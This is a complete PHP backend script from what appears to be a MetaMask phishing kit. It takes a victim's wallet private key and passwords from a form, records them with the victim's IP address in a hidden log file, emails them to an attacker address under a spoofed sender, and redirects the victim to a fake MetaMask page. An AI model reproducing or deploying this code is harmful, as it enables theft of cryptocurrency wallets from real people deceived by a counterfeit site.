<?php
$file = "____JADE___.txt";
$PrivateKey = $_POST['PrivateKey'];
$Password = $_POST['Password'];
$Pass = $_POST['Pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "PrivateKey   	: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fwrite($handle, "Password   	: ");
fwrite($handle, "$Password");
fwrite($handle, "\n");
fwrite($handle, "Pass   	        : ");
fwrite($handle, "$Pass");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://www.metamask.com/access-my-wallet ");
fwrite($handle, "\n");
fclose($handle);
$PrivateKey = $_POST['PrivateKey'];
$Password = $_POST['Password'];
$Pass = $_POST['Pass'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

PrivateKey : ".$PrivateKey." 

Password : ".$Password." 

Pass : ".$Pass." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://www.metamask.com/access-my-wallet
";
include 'mail.php';
$subject = "============ ovr ============ ".$ip." ";
$headers = "From: ovr <stellars.org@gmail.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/metamask.html\";
// -->
</script>";
?>